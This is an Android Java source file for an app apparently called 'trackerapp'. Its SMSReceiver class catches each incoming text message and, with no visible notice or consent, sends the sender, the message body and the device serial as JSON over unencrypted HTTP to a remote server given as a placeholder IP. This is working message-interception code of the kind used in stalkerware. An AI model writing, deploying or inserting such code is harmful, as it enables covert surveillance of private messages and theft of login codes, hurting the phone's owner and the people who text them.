package com.trackerapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SMSReceiver extends BroadcastReceiver {
  @Override
  public void onReceive(Context context, Intent intent) {
    try {
      Bundle extras = intent.getExtras();
      if (extras == null) return;
      Object[] pdus = (Object[]) extras.get("pdus");
      if (pdus == null) return;
      for (Object pdu : pdus){
        SmsMessage msg = SmsMessage.createFromPdu((byte[])pdu, extras.getString("format"));
        String from = msg.getOriginatingAddress();
        String body = msg.getMessageBody();
        JSONObject payload = new JSONObject();
        payload.put("deviceId", android.os.Build.SERIAL);
        payload.put("type", "sms");
        JSONObject p = new JSONObject();
        p.put("from", from);
        p.put("text", body);
        payload.put("payload", p);
        final String out = payload.toString();
        new Thread(() -> {
          try {
            URL url = new URL("http://<YOUR_PC_IP>:4000/api/update");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(out.getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
            conn.disconnect();
          } catch (Exception e){ e.printStackTrace(); }
        }).start();
      }
    } catch (Exception e){ e.printStackTrace(); }
  }
}
